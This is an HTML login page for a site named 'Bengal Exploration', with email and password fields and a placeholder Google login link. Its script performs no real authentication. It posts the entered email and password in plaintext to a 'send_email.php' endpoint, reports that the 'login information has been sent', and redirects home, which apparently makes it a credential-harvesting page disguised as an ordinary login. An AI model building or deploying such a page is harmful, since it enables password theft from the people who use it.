<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Bengal Exploration</title>
    <style>
        /* Add your styles here */
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login</h2>
        
        <form id="loginForm" method="POST">
            <input type="email" placeholder="Email" id="email" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" class="btn">Login</button>
        </form>
        
        <button class="btn" onclick="location.href='YOUR_LOGIN_PAGE_LINK'">Login with Google</button>
        
        <div class="footer-links">
            <a href="index.html">Return to Home</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function(event) {
            event.preventDefault(); // Prevent form submission

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Send data to the server
            fetch('send_email.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            })
            .then(response => {
                if (response.ok) {
                    alert('Login information has been sent successfully!');
                    window.location.href = "index.html"; // Redirect after submission
                } else {
                    alert('Error sending login information. Status: ' + response.status);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error sending login information. Please check the console for details.');
            });
        };
    </script>

</body>
</html>
